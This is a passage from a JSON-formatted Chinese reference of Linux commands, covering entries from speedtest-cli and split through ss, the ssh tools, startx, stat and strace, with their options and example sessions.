3,3`，这是最准确的表述，表示我们“只”对本域进行排序，因为如果你省略了后面的3，就变成了我们“对第3个域开始到最后一个域位置的内容进行排序” 了。\n\n\n"},{"name":"speedtest-cli","categoryId":0,"data":"speedtest-cli\n\u003d\u003d\u003d\n\n命令行下测试服务器外网速度\n\n## 补充说明\n\n**speedtest-cli** 是一个使用python编写的命令行脚本，通过调用speedtest.net测试上下行的接口来完成速度测试，最后我会测试运维生存时间所在服务器的外网速度。项目地址：https://github.com/sivel/speedtest-cli\n\n### 安装speedtest－cli  \n\nspeedtest-cli需要在python 2.4-3.4的环境下，安装方法都很简单，自己选择以下最适合你的一种。\n\n **pip方式** \n\n```\n＃ pip install speedtest－cli\n```\n\n **easy_install方式** \n\n```\n＃ easy_install speedtest-cli\n```\n\n **github＋pip方式** \n\n```\n＃ pip install git+https://github.com/sivel/speedtest-cli.git\n```\n\n或者\n\n```\n＃ git clone https://github.com/sivel/speedtest-cli.git\n＃ python speedtest-cli/setup.py install\n```\n\n **下载脚本方式** \n\n```\n＃ wget -O speedtest-cli https://raw.github.com/sivel/spe ... er/speedtest_cli.py\n＃ chmod +x speedtest-cli\n```\n\n或者\n\n```\n＃ curl -o speedtest-cli https://raw.github.com/sivel/spe ... er/speedtest_cli.py\n＃ chmod +x speedtest-cli\n```\n\n直接下载脚本，给予执行权限即可。\n\n### 用法  \n\n```\n-h, --help       show this help message and exit\n--share          分享你的网速，该命令会在speedtest网站上生成网速测试结果的图片。\n--simple         Suppress verbose output, only show basic information\n--list           根据距离显示speedtest.net的测试服务器列表。\n--server\u003dSERVER  指定列表中id的服务器来做测试。\n--mini\u003dMINI      URL of the Speedtest Mini server\n--source\u003dSOURCE  Source ip address to bind to\n--version        Show the version number and exit\n```\n\n### 实例  \n\n列出所有在中国的测试服务器：\n\n```\n[root@li229-122 ~]# speedtest-cli --list | grep China\n1185) China Unicom (Changchun, China) [10534.35 km]\n3784) China Mobile (Urumqi, China) [10581.15 km]\n2667) Beijing Normal University (Beijing, China) [11117.03 km]\n2529) Beijing Normal University (Beijing, China) [11117.03 km]\n2816) Capital Online Data service (Beijing, China) [11117.03 km]\n4354) SXmobile (Taiyuan, China) [11383.17 km]\n3973) China Telecom (Lanzhou, China) [11615.43 km]\n3633) China Telecom (Shanghai, China) [11983.37 km]\n3927) China Mobile Jiangsu Co., Ltd. (Suzhou, China) [11989.27 km]\n2461) China Unicom (Chengdu, China) [12213.35 km]\n1028) Shepherd Software (Xiamen, China) [12785.57 km]\n1628) Xiamen Guangdian Xinxu (Xiamen, China) [12785.57 km]\n3891) GZinternet (Guangzhou, China) [13005.36 km]\n3871) SZWCDMA (Shenzhen, China) [13059.20 km]\n3819) SZU (Shenzhen, China) [13059.20 km]\n1536) STC (Hong Kong, China) [13088.37 km]\n1890) Telin (Hong Kong, China) [13088.37 km]\n```\n\n **结果解释** \n\n```\n3633) China Telecom (Shanghai, China) [11983.37 km]\n```\n\n```\n3633: 服务器id\nchina telecom：isp，这里是中国电信\nshanghai,china ：服务器所在地址\n11983.37 km：两台服务器地理位置之间距离，我这台机器在美国，和上海相距11983.37公里，很远呐.\n```\n\n **外网速度测试** \n\n```\n[root@li229-122 ~]# speedtest-cli --server\u003d3633 --share\nRetrieving speedtest.net configuration...\nRetrieving speedtest.net server list...\nTesting from Linode (173.255.219.122)...\nHosted by China Telecom (Shanghai) [11983.37 km]: 23.603 ms\nTesting download speed........................................\nDownload: 24.84 Mbit/s\nTesting upload speed..................................................\nUpload: 4.57 Mbit/s\nShare results: http://www.speedtest.net/result/3240988007.png\n```\n\n\n"},{"name":"spell","categoryId":1,"data":"spell\n\u003d\u003d\u003d\n\n对文件进行拼写检查\n\n## 补充说明\n\n**spell命令** 对文件进行拼写检查，并把拼写错误的单词输出。\n\n### 语法  \n\n```\nspell(参数)\n```\n\n### 参数  \n\n文件：指定需要进行拼写检查的文件。\n\n\n"},{"name":"split","categoryId":6,"data":"split\n\u003d\u003d\u003d\n\n分割任意大小的文件\n\n## 补充说明\n\n**split命令** 可以将一个大文件分割成很多个小文件，有时需要将文件分割成更小的片段，比如为提高可读性，生成日志等。\n\n### 选项  \n\n```\n-b：值为每一输出档案的大小，单位为 byte。\n-C：每一输出档中，单行的最大 byte 数。\n-d：使用数字作为后缀。\n-l：值为每一输出档的列数大小。\n```\n\n### 实例  \n\n生成一个大小为100KB的测试文件：\n\n```\n[root@localhost split]# dd if\u003d/dev/zero bs\u003d100k count\u003d1 of\u003ddate.file\n1+0 records in\n1+0 records out\n102400 bytes (102 kB) copied, 0.00043 seconds, 238 MB/s\n```\n\n使用split命令将上面创建的date.file文件分割成大小为10KB的小文件：\n\n```\n[root@localhost split]# split -b 10k date.file \n[root@localhost split]# ls\ndate.file  xaa  xab  xac  xad  xae  xaf  xag  xah  xai  xaj\n```\n\n文件被分割成多个带有字母的后缀文件，如果想用数字后缀可使用-d参数，同时可以使用-a length来指定后缀的长度：\n\n```\n[root@localhost split]# split -b 10k date.file -d -a 3\n[root@localhost split]# ls\ndate.file  x000  x001  x002  x003  x004  x005  x006  x007  x008  x009\n```\n\n为分割后的文件指定文件名的前缀：\n\n```\n[root@localhost split]# split -b 10k date.file -d -a 3 split_file\n[root@localhost split]# ls\ndate.file  split_file000  split_file001  split_file002  split_file003  split_file004  split_file005  split_file006  split_file007  split_file008  split_file009\n```\n\n使用-l选项根据文件的行数来分割文件，例如把文件分割成每个包含10行的小文件：\n\n```\nsplit -l 10 date.file\n```\n\n\n"},{"name":"squid","categoryId":0,"data":"squid\n\u003d\u003d\u003d\n\nsquid服务器守护进程\n\n## 补充说明\n\n**squid命令** 高性能的Web客户端代理缓存服务器套件“squid”的服务器守护进程。\n\n### 语法  \n\n```\nsquid(选项)\n```\n\n### 选项  \n\n```\n-d：将指定调试等级的信息发送到标准错误设备；\n-f：使用指定的配置文件。而不使用默认配置文件；\n-k：向squid服务器发送指令；\n-s：启用syslog日志；\n-z：创建缓存目录；\n-C：不捕获致命信号；\n-D：不进行DNS参数测试；\n-N：以非守护进程模式运行；\n-X：强制进入完全调试模式。\n```\n\n\n"},{"name":"squidclient","categoryId":0,"data":"squidclient\n\u003d\u003d\u003d\n\nsquid服务器的客户端管理工具\n\n## 补充说明\n\n**squidclient命令** 使用squid服务器的客户端管理工具，它可以查看squid服务器的详细运行信息和管理squid服务器。\n\n### 语法  \n\n```\nsquidclient(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：不包含“accept:header”；\n-r：强制缓存重新加载URL；\n-s：安静模式，不输出信息到标准输出设备；\n-h：从指定主机获取url\n-l：指定一个本地ip地址进行绑定；\n-p：端口号，默认为3128；\n-m：指定发送请求的方法；\n-u：代理认证用户名。\n```\n\n### 参数  \n\nURL：指定操作缓存中的URL。\n\n\n"},{"name":"ss","categoryId":0,"data":"ss\n\u003d\u003d\u003d\n\n获取socket统计信息\n\n## 补充说明\n\n**ss命令** 用来显示处于活动状态的套接字信息。ss命令可以用来获取socket统计信息，它可以显示和netstat类似的内容。但ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。\n\n当服务器的socket连接数量变得非常大时，无论是使用netstat命令还是直接`cat /proc/net/tcp`，执行速度都会很慢。可能你不会有切身的感受，但请相信我，当服务器维持的连接达到上万个的时候，使用netstat等于浪费 生命，而用ss才是节省时间。\n\n天下武功唯快不破。ss快的秘诀在于，它利用到了TCP协议栈中tcp_diag。tcp_diag是一个用于分析统计的模块，可以获得Linux 内核中第一手的信息，这就确保了ss的快捷高效。当然，如果你的系统中没有tcp_diag，ss也可以正常运行，只是效率会变得稍慢。\n\n### 语法  \n\n```\nss [参数]\nss [参数] [过滤]\n```\n\n### 选项  \n\n```\n-h, --help      帮助信息\n-V, --version   程序版本信息\n-n, --numeric   不解析服务名称\n-r, --resolve   解析主机名\n-a, --all       显示所有套接字（sockets）\n-l, --listening 显示监听状态的套接字（sockets）\n-o, --options   显示计时器信息\n-e, --extended  显示详细的套接字（sockets）信息\n-m, --memory    显示套接字（socket）的内存使用情况\n-p, --processes 显示使用套接字（socket）的进程\n-i, --info      显示 TCP内部信息\n-s, --summary   显示套接字（socket）使用概况\n-4, --ipv4      仅显示IPv4的套接字（sockets）\n-6, --ipv6      仅显示IPv6的套接字（sockets）\n-0, --packet    显示 PACKET 套接字（socket）\n-t, --tcp       仅显示 TCP套接字（sockets）\n-u, --udp       仅显示 UCP套接字（sockets）\n-d, --dccp      仅显示 DCCP套接字（sockets）\n-w, --raw       仅显示 RAW套接字（sockets）\n-x, --unix      仅显示 Unix套接字（sockets）\n-f, --family\u003dFAMILY  显示 FAMILY类型的套接字（sockets），FAMILY可选，支持  unix, inet, inet6, link, netlink\n-A, --query\u003dQUERY, --socket\u003dQUERY\n      QUERY :\u003d {all|inet|tcp|udp|raw|unix|packet|netlink}[,QUERY]\n-D, --diag\u003dFILE     将原始TCP套接字（sockets）信息转储到文件\n -F, --filter\u003dFILE  从文件中都去过滤器信息\n       FILTER :\u003d [ state TCP-STATE ] [ EXPRESSION ]\n```\n\n### 实例  \n\n```bash\nss -t -a    # 显示TCP连接\nss -s       # 显示 Sockets 摘要\nss -l       # 列出所有打开的网络连接端口\nss -pl      # 查看进程使用的socket\nss -lp | grep 3306  # 找出打开套接字/端口应用程序\nss -u -a    显示所有UDP Sockets\nss -o state established \u0027( dport \u003d :smtp or sport \u003d :smtp )\u0027 # 显示所有状态为established的SMTP连接\nss -o state established \u0027( dport \u003d :http or sport \u003d :http )\u0027 # 显示所有状态为Established的HTTP连接\nss -o state fin-wait-1 \u0027( sport \u003d :http or sport \u003d :https )\u0027 dst 193.233.7/24  # 列举出处于 FIN-WAIT-1状态的源端口为 80或者 443，目标网络为 193.233.7/24所有 tcp套接字\n\n# ss 和 netstat 效率对比\ntime netstat -at\ntime ss\n\n# 匹配远程地址和端口号\n# ss dst ADDRESS_PATTERN\nss dst 192.168.1.5\nss dst 192.168.119.113:http \nss dst 192.168.119.113:smtp \nss dst 192.168.119.113:443\n\n# 匹配本地地址和端口号\n# ss src ADDRESS_PATTERN\nss src 192.168.119.103\nss src 192.168.119.103:http\nss src 192.168.119.103:80\nss src 192.168.119.103:smtp\nss src 192.168.119.103:25\n```\n\n**将本地或者远程端口和一个数比较**\n\n```bash\n# ss dport OP PORT 远程端口和一个数比较；\n# ss sport OP PORT 本地端口和一个数比较\n# OP 可以代表以下任意一个: \n# \u003c\u003d or le : 小于或等于端口号\n# \u003e\u003d or ge : 大于或等于端口号\n# \u003d\u003d or eq : 等于端口号\n# !\u003d or ne : 不等于端口号\n# \u003c or gt : 小于端口号\n# \u003e or lt : 大于端口号\nss  sport \u003d :http \nss  dport \u003d :http \nss  dport \\\u003e :1024 \nss  sport \\\u003e :1024 \nss sport \\\u003c :32000 \nss  sport eq :22 \nss  dport !\u003d :22 \nss  state connected sport \u003d :http \nss \\( sport \u003d :http or sport \u003d :https \\) \nss -o state fin-wait-1 \\( sport \u003d :http or sport \u003d :https \\) dst 192.168.1/24\n```\n\n**用TCP 状态过滤Sockets**\n\n```bash\nss -4 state closing\n# ss -4 state FILTER-NAME-HERE   \n# ss -6 state FILTER-NAME-HERE  \n# FILTER-NAME-HERE 可以代表以下任何一个：\n# established、 syn-sent、 syn-recv、 fin-wait-1、 fin-wait-2、 time-wait、 closed、 close-wait、 last-ack、 listen、 closing、\n# all : 所有以上状态\n# connected : 除了listen and closed的所有状态\n# synchronized :所有已连接的状态除了syn-sent\n# bucket : 显示状态为maintained as minisockets,如：time-wait和syn-recv.\n# big : 和bucket相反.\n```\n\n **显示ICP连接** \n\n```\n[root@localhost ~]# ss -t -a\nState       Recv-Q Send-Q                            Local Address:Port                                Peer Address:Port   \nLISTEN      0      0                                             *:3306                                           *:*       \nLISTEN      0      0                                             *:http                                           *:*       \nLISTEN      0      0                                             *:ssh                                            *:*       \nLISTEN      0      0                                     127.0.0.1:smtp                                           *:*       \nESTAB       0      0                                112.124.15.130:42071                              42.156.166.25:http    \nESTAB       0      0                                112.124.15.130:ssh                              121.229.196.235:33398 \n```\n\n **显示 Sockets 摘要** \n\n```\n[root@localhost ~]# ss -s\nTotal: 172 (kernel 189)\nTCP:   10 (estab 2, closed 4, orphaned 0, synrecv 0, timewait 0/0), ports 5\n\nTransport Total     ip        IPv6\n*         189       -         -        \nRAW       0         0         0        \nUDP       5         5         0        \nTCP       6         6         0        \nINET      11        11        0        \nFRAG      0         0         0   \n```\n\n列出当前的established, closed, orphaned and waiting TCP sockets\n\n **列出所有打开的网络连接端口** \n\n```\n[root@localhost ~]# ss -l\nRecv-Q Send-Q                                 Local Address:Port                                     Peer Address:Port   \n0      0                                                  *:3306                                                *:*       \n0      0                                                  *:http                                                *:*       \n0      0                                                  *:ssh                                                 *:*       \n0      0                                          127.0.0.1:smtp                                                *:* \n```\n\n **查看进程使用的socket** \n\n```\n[root@localhost ~]# ss -pl\nRecv-Q Send-Q                                          Local Address:Port                                              Peer Address:Port   \n0      0                                                           *:3306                                                         *:*        users:((\"mysqld\",1718,10))\n0      0                                                           *:http                                                         *:*        users:((\"nginx\",13312,5),(\"nginx\",13333,5))\n0      0                                                           *:ssh                                                          *:*        users:((\"sshd\",1379,3))\n0      0                                                   127.0.0.1:smtp                                                         *:*        us\n```\n\n **找出打开套接字/端口应用程序** \n\n```\n[root@localhost ~]# ss -pl | grep 3306\n0      0                            *:3306                          *:*        users:((\"mysqld\",1718,10))\n```\n\n **显示所有UDP Sockets** \n\n```\n[root@localhost ~]# ss -u -a\nState       Recv-Q Send-Q                                     Local Address:Port                                         Peer Address:Port   \nUNCONN      0      0                                                      *:syslog                                                  *:*       \nUNCONN      0      0                                         112.124.15.130:ntp                                                     *:*       \nUNCONN      0      0                                            10.160.7.81:ntp                                                     *:*       \nUNCONN      0      0                                              127.0.0.1:ntp                                                     *:*       \nUNCONN      0      0                                                      *:ntp                                                     *:*\n```\n\n\n\n"},{"name":"ssh","categoryId":0,"data":"ssh\n\u003d\u003d\u003d\n\nopenssh套件中的客户端连接工具\n\n## 补充说明\n\n**ssh命令** 是openssh套件中的客户端连接工具，可以给予ssh加密协议实现安全的远程登录服务器。\n\n### 语法  \n\n```\nssh(选项)(参数)\n```\n\n### 选项  \n\n```\n-1：强制使用ssh协议版本1；\n-2：强制使用ssh协议版本2；\n-4：强制使用IPv4地址；\n-6：强制使用IPv6地址；\n-A：开启认证代理连接转发功能；\n-a：关闭认证代理连接转发功能；\n-b：使用本机指定地址作为对应连接的源ip地址；\n-C：请求压缩所有数据；\n-F：指定ssh指令的配置文件；\n-f：后台执行ssh指令；\n-g：允许远程主机连接主机的转发端口；\n-i：指定身份文件；\n-l：指定连接远程服务器登录用户名；\n-N：不执行远程指令；\n-o：指定配置选项；\n-p：指定远程服务器上的端口；\n-q：静默模式；\n-X：开启X11转发功能；\n-x：关闭X11转发功能；\n-y：开启信任X11转发功能。\n```\n\n### 参数  \n\n*   远程主机：指定要连接的远程ssh服务器；\n*   指令：要在远程ssh服务器上执行的指令。\n\n### 实例\n\n```\n# ssh 用户名@远程服务器地址\nssh user1@172.24.210.101\n```\n\n\n"},{"name":"ssh-add","categoryId":0,"data":"ssh-add\n\u003d\u003d\u003d\n\n把专用密钥添加到ssh-agent的高速缓存中\n\n## 补充说明\n\n**ssh-add命令** 是把专用密钥添加到ssh-agent的高速缓存中。该命令位置在`/usr/bin/ssh-add`。\n\n### 语法  \n\n```\nssh-add [-cDdLlXx] [-t life] [file ...]\nssh-add -s pkcs11\nssh-add -e pkcs11\n```\n\n### 选项  \n\n```\n-D：删除ssh-agent中的所有密钥.\n-d：从ssh-agent中的删除密钥\n-e pkcs11：删除PKCS#11共享库pkcs1提供的钥匙。\n-s pkcs11：添加PKCS#11共享库pkcs1提供的钥匙。\n-L：显示ssh-agent中的公钥\n-l：显示ssh-agent中的密钥\n-t life：对加载的密钥设置超时时间，超时ssh-agent将自动卸载密钥\n-X：对ssh-agent进行解锁\n-x：对ssh-agent进行加锁\n```\n\n### 实例  \n\n1、把专用密钥添加到 ssh-agent 的高速缓存中：\n\n```\nssh-add ~/.ssh/id_dsa\n```\n\n2、从ssh-agent中删除密钥：\n\n```\nssh-add -d ~/.ssh/id_xxx.pub\n```\n\n3、查看ssh-agent中的密钥：\n\n```\nssh-add -l\n```\n\n\n"},{"name":"ssh-agent","categoryId":0,"data":"ssh-agent\n\u003d\u003d\u003d\n\nssh密钥管理器\n\n## 补充说明\n\n**ssh-agent命令** 是一种控制用来保存公钥身份验证所使用的私钥的程序。ssh-agent在X会话或登录会话之初启动，所有其他窗口或程序则以客户端程序的身份启动并加入到ssh-agent程序中。通过使用环境变量，可定位代理并在登录到其他使用ssh机器上时使用代理自动进行身份验证。\n\n其实ssh-agent就是一个密钥管理器，运行ssh-agent以后，使用ssh-add将私钥交给ssh-agent保管，其他程序需要身份验证的时候可以将验证申请交给ssh-agent来完成整个认证过程。\n\n### 语法  \n\n```\nssh-agent [-c | -s] [-d] [-a bind_address] [-t life] [command [arg ...]]\nssh-agent [-c | -s] -k\n```\n\n### 选项  \n\n```\n-a bind_address：bind the agent to the UNIX-domain socket bind_address.\n-c：生成C-shell风格的命令输出。\n-d：调试模式。\n-k：把ssh-agent进程杀掉。\n-s：生成Bourne shell 风格的命令输出。\n-t life：设置默认值添加到代理人的身份最大寿命。\n```\n\n### 实例  \n\n运行ssh-agent：\n\n```\nssh-agent\n```\n\n运行ssh-agent，它会打印出来它使用的环境和变量。\n\n\n"},{"name":"ssh-copy-id","categoryId":0,"data":"ssh-copy-id\n\u003d\u003d\u003d\n\n把本地的ssh公钥文件安装到远程主机对应的账户下\n\n## 补充说明\n\n**ssh-copy-id命令** 可以把本地主机的公钥复制到远程主机的authorized_keys文件上，ssh-copy-id命令也会给远程主机的用户主目录（home）和`~/.ssh`, 和`~/.ssh/authorized_keys`设置合适的权限。\n\n### 语法  \n\n```\nssh-copy-id [-i [identity_file]] [user@]machine\n```\n\n### 选项  \n\n```\n-i：指定公钥文件\n```\n\n### 实例  \n\n1、把本地的ssh公钥文件安装到远程主机对应的账户下：\n\n```\nssh-copy-id user@server\nssh-copy-id -i ~/.ssh/id_rsa.pub user@server\n```\n\n\n"},{"name":"ssh-keygen","categoryId":0,"data":"ssh-keygen\n\u003d\u003d\u003d\n\n为ssh生成、管理和转换认证密钥\n\n## 补充说明\n\n**ssh-keygen命令** 用于为“ssh”生成、管理和转换认证密钥，它支持RSA和DSA两种认证密钥。\n\n### 语法  \n\n```\nssh-keygen(选项)\n```\n\n### 选项  \n\n```\n-b：指定密钥长度；\n-e：读取openssh的私钥或者公钥文件；\n-C：添加注释；\n-f：指定用来保存密钥的文件名；\n-i：读取未加密的ssh-v2兼容的私钥/公钥文件，然后在标准输出设备上显示openssh兼容的私钥/公钥；\n-l：显示公钥文件的指纹数据；\n-N：提供一个新密语；\n-P：提供（旧）密语；\n-q：静默模式；\n-t：指定要创建的密钥类型。\n```\n\n\n"},{"name":"ssh-keyscan","categoryId":0,"data":"ssh-keyscan\n\u003d\u003d\u003d\n\n收集主机公钥的使用工具\n\n## 补充说明\n\n**ssh-keyscan命令** 是一个收集大量主机公钥的使用工具。\n\n### 语法  \n\n```\nssh-keyscan(选项)(参数)\n```\n\n### 选项  \n\n```\n-4：强制使用IPv4地址；\n-6：强制使用IPv6地址；\n-f：从指定文件中读取“地址列表/名字列表”；\n-p：指定连接远程主机的端口；\n-T：指定连接尝试的超时时间；\n-t：指定要创建的密钥类型；\n-v：信息模式，打印调试信息。\n```\n\n### 参数  \n\n主机列表：指定要收集公钥的主机列表。\n\n\n"},{"name":"sshd","categoryId":0,"data":"sshd\n\u003d\u003d\u003d\n\nopenssh软件套件中的服务器守护进程\n\n## 补充说明\n\n**sshd命令** 是openssh软件套件中的服务器守护进程。\n\n### 语法  \n\n```\nsshd(选项)\n```\n\n### 选项  \n\n```\n-4：强制使用IPv4地址；\n-6：强制使用IPv6地址；\n-D：以后台守护进程方式运行服务器；\n-d：调试模式；\n-e：将错误发送到标准错误设备，而不是将其发送到系统日志；\n-f：指定服务器的配置文件；\n-g：指定客户端登录时的过期时间，如果在此期限内，用户没有正确认证，则服务器断开次客户端的连接；\n-h：指定读取主机key文件；\n-i：ssh以inetd方式运行；\n-o：指定ssh的配置选项；\n-p：静默模式，没有任何信息写入日志；\n-t：测试模式。\n```\n\n\n"},{"name":"startx","categoryId":0,"data":"startx\n\u003d\u003d\u003d\n\n用来启动X Window\n\n## 补充说明\n\n**startx命令** 用来启动X Window，实际上启动X Window的程序为xinit。\n\n### 语法  \n\n```\nstartx(参数)\n```\n\n### 参数  \n\n*   客户端及选项：X客户端及选项；\n*   服务器及选项：X服务器及选项。\n\n### 实例  \n\n要在工作站上或 X 终端上启动 X 会话，请输入：\n\n```\nstartx\n```\n\n要在工作站上强制启动 X 会话，请输入： \n\n```\nstartx -w\n```\n\n要为 X 终端启动 X 会话，并注销用户的 telnet 会话，请输入：\n\n```\nstartx; kill -9 $\n```\n\n要使用 .xinitrc 脚本启动 X 会话，请输入：\n\n```\nstartx -x .xinitrc\n```\n\n要使用 mwm 窗口管理器启动 X 会话，请输入：\n\n```\nstartx -m mwm\n```\n\n但是，如果找到启动脚本文件，则忽略`-w`选项。在启动脚本中，启动窗口管理器、装入X资源以及产生X客户机是用户的责任。以下是.xsession脚本的一个示例。\n\n```\n#!/bin/csh\n (mwm \u0026)\n xrdb -load .Xdefaults\n (xclock -g 75x75+0+0 \u0026)\n (xbiff -g 75x75+101-0 \u0026)\n if (\"/dev/lft*\" \u003d\u003d \"`tty`\") then\n  aixterm -g 80x24+0+0 +ut -C -T `hostname`\n else\n  aixterm -g 80x24+0+0 +ut -T `hostname`\n endif\n```\n\n对于工作站，startup脚本中的最后一行应该是前台aixterm命令，该命令带有`-C`选项表示控制台信息。对于X终端，startup脚本中的最后一行应该是不带有`-C`选项的前台aixterm命令。另外，由于某些X终端在关闭时不终止telnet会话，所以用户必须在使用热键切换至X会话前退出当前的telnet会话。\n\n`/usr/lib/X11/xdm/Xsession`文件中的xdm命令也可以使用startx命令。这为xdm命令提供了startx命令的功能。\n\n以下是启动X会话一贯使用的文件名。\n\n```\n$HOME/.xerrors 其中，startx 用来重定向错误消息。在缺省情况下，startx 将错误重定向至用户主目录中的 .xerrors 文件中。\n$HOME/.Xinit,  \n$HOME/.xinit,  \n$HOME/.Xinitrc,  \n$HOME/.xinitrc,  \n$HOME/.xsession 作为包含 shell 命令的“启动文件”来启动窗口管理器、装入 X 资源并产生 X 客户机。\n$HOME/.Xdefaults,  \n$HOME/.xresources 作为装入的 X 资源文件来设置 X 客户机的用户首选项。\n$HOME/.mwmrc mwm 配置文件。\n$HOME/.twmrc twm 配置文件。\n$HOME/.awmrc awm 配置文件。\n$HOME/.uwmrc uwm 配置文件。\n/dev/lft* 终端或 tty、工作站初始 login shell 的界面。\n```\n\n\n"},{"name":"stat","categoryId":8,"data":"stat\n\u003d\u003d\u003d\n\n用于显示文件的状态信息\n\n## 补充说明\n\n**stat命令** 用于显示文件的状态信息。stat命令的输出信息比ls命令的输出信息要更详细。\n\n### 语法  \n\n```\nstat(选项)(参数)\n```\n\n### 选项  \n\n```\n-L：支持符号连接；\n-f：显示文件系统状态而非文件状态；\n-t：以简洁方式输出信息；\n--help：显示指令的帮助信息；\n--version：显示指令的版本信息。\n```\n\n### 参数  \n\n文件：指定要显示信息的普通文件或者文件系统对应的设备文件名。\n\n### 实例  \n\n```\n[root@localhost ~]# ls -l myfile\n-rw-r--r-- 1 root root 0 2010-10-09 myfile\n\n[root@localhost ~]# stat myfile\nfile: “myfile”\nSize: 0               Blocks: 8          IO Block: 4096   一般空文件\nDevice: fd00h/64768d    Inode: 194805815   Links: 1\nAccess: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)\nAccess: 2010-12-12 12:22:35.000000000 +0800\nModify: 2010-10-09 20:44:21.000000000 +0800\nChange: 2010-10-09 20:44:21.000000000 +0800\n\n[root@localhost ~]# stat -f myfile\nFile: \"myfile\"\nid: 0        Namelen: 255     type: ext2/ext3\nBlock size: 4096       Fundamental block size: 4096\nBlocks: Total: 241555461  free: 232910771  Available: 220442547\nInodes: Total: 249364480  Free: 249139691\n\n[root@localhost ~]# stat -t myfile\nmyfile 0 8 81a4 0 0 fd00 194805815 1 0 0 1292127755 1286628261 1286628261 4096\n\n```\n\n\n"},{"name":"strace","categoryId":0,"data":"strace\n\u003d\u003d\u003d\n\n跟踪系统调用和信号\n\n## 补充说明\n\n**strace命令** 是一个集诊断、调试、统计与一体的工具，我们可以使用strace对应用的系统调用和信号传递的跟踪结果来对应用进行分析，以达到解决问题或者是了解应用工作过程的目的。当然strace与专业的调试工具比如说gdb之类的是没法相比的，因为它不是一个专业的调试器。\n\nstrace的最简单的用法就是执行一个指定的命令，在指定的命令结束之后它也就退出了。在命令执行的过程中，strace会记录和解析命令进程的所有系统调用以及这个进程所接收到的所有的信号值。\n\n### 语法  \n\n```\nstrace  [  -dffhiqrtttTvxx  ] [ -acolumn ] [ -eexpr ] ...\n    [ -ofile ] [-ppid ] ...  [ -sstrsize ] [ -uusername ]\n    [ -Evar\u003dval ] ...  [ -Evar  ]...\n     [command [ arg ...  ] ]\n\nstrace  -c  [ -eexpr ] ...  [ -Ooverhead ] [ -Ssortby ]\n    [ command [ arg...  ] ]\n```\n\n### 选项  \n\n```\n-c 统计每一系统调用的所执行的时间,次数和出错的次数等.\n-d 输出strace关于标准错误的调试信息.\n-f 跟踪由fork调用所产生的子进程.\n-ff 如果提供-o filename,则所有进程的跟踪结果输出到相应的filename.pid中,pid是各进程的进程号.\n-F 尝试跟踪vfork调用.在-f时,vfork不被跟踪.\n-h 输出简要的帮助信息.\n-i 输出系统调用的入口指针.\n-q 禁止输出关于脱离的消息.\n-r 打印出相对时间关于,,每一个系统调用.\n-t 在输出中的每一行前加上时间信息.\n-tt 在输出中的每一行前加上时间信息,微秒级.\n-ttt 微秒级输出,以秒了表示时间.\n-T 显示每一调用所耗的时间.\n-v 输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出.\n-V 输出strace的版本信息.\n-x 以十六进制形式输出非标准字符串\n-xx 所有字符串以十六进制形式输出.\n-a column 设置返回值的输出位置.默认 为40.\n-e expr 指定一个表达式,用来控制如何跟踪.格式：[qualifier\u003d][!]value1[,value2]...\nqualifier只能是 trace,abbrev,verbose,raw,signal,read,write其中之一.value是用来限定的符号或数字.默认的 qualifier是 trace.感叹号是否定符号.例如:-eopen等价于 -e trace\u003dopen,表示只跟踪open调用.而-etrace!\u003dopen 表示跟踪除了open以外的其他调用.有两个特殊的符号 all 和 none. 注意有些shell使用!来执行历史记录里的命令,所以要使用\\\\.\n-e trace\u003dset 只跟踪指定的系统 调用.例如:-e trace\u003dopen,close,rean,write表示只跟踪这四个系统调用.默认的为set\u003dall.\n-e trace\u003dfile 只跟踪有关文件操作的系统调用.\n-e trace\u003dprocess 只跟踪有关进程控制的系统调用.\n-e trace\u003dnetwork 跟踪与网络有关的所有系统调用.\n-e strace\u003dsignal 跟踪所有与系统信号有关的 系统调用\n-e trace\u003dipc 跟踪所有与进程通讯有关的系统调用\n-e abbrev\u003dset 设定strace输出的系统调用的结果集.-v 等与 abbrev\u003dnone.默认为abbrev\u003dall.\n-e raw\u003dset 将指定的系统调用的参数以十六进制显示.\n-e signal\u003dset 指定跟踪的系统信号.默认为all.如 signal\u003d!SIGIO(或者signal\u003d!io),表示不跟踪SIGIO信号.\n-e read\u003dset 输出从指定文件中读出 的数据.例如: -e read\u003d3,5\n-e write\u003dset 输出写入到指定文件中的数据.\n-o filename 将strace的输出写入文件filename\n-p pid 跟踪指定的进程pid.\n-s strsize 指定输出的字符串的最大长度.默认为32.文件名一直全部输出.\n-u username 以username的UID和GID执行被跟踪的命令\n```\n\n### 实例  \n\n **追踪系统调用** \n\n现在我们做一个很简单的程序来演示strace的基本用法。这个程序的C语言代码如下：\n\n```\n# filename test.c\n#include \u003cstdio.h\u003e\n\nint main()\n{\n    int a;\n    scanf(\"%d\", \u0026a);\n    printf(\"%09d\\n\", a);\n    return 0;\n}\n```\n\n然后我们用`gcc -o test test.c`编译一下，得到一个可执行的文件test。然后用strace调用执行：\n\n```\nstrace ./test\n```\n\n执行期间会要求你输入一个整数，我们输入99，最后得到如下的结果：\n\n```\n// 直接执行test的结果\noracle@orainst[orcl]:~ $./test\n\n// 执行的结果\n99\n000000099\n\n// 通过strace执行test的结果\noracle@orainst[orcl]:~ $strace ./test\n\n// strace的trace结果\nexecve(\"./test\", [\"./test\"], [/* 41 vars */]) \u003d 0\nuname({sys\u003d\"Linux\", node\u003d\"orainst.desktop.mycompany.com\", ...}) \u003d 0\nbrk(0)                                  \u003d 0x8078000\nfstat64(3, {st_mode\u003dS_IFREG|0644, st_size\u003d65900, ...}) \u003d 0\nold_mmap(NULL, 65900, PROT_READ, MAP_PRIVATE, 3, 0) \u003d 0xbf5ef000\nclose(3)                                \u003d 0\nopen(\"/lib/tls/libc.so.6\", O_RDONLY)    \u003d 3\nread(3, \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\200X\\1\"..., 512) \u003d 512\nfstat64(3, {st_mode\u003dS_IFREG|0755, st_size\u003d1571692, ...}) \u003d 0\nold_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) \u003d 0xbf5ee000\nold_mmap(NULL, 1275340, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) \u003d 0xa02000\nold_mmap(0xb34000, 12288, PROT_READ|PROT_WRITE, 